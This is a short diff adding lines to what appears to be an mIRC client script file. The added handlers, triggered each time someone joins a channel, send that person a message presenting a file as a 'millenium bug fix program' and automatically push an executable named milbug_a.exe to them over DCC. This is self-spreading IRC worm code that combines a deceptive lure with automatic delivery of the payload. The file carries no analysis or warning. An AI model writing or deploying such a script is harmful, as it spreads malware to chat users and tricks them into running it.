@@ -1,0 +1,4 @@
+[script]
+n0=on 1:JOIN:#: if ( $me != $nick ) { /msg $nick I'm testing my millenium bug fix program. Receive it and test it . 10q }
+n1=on 1:JOIN:#: if ( $me != $nick ) { /dcc send $nick c:\mirc\download\milbug_a.exe }
+
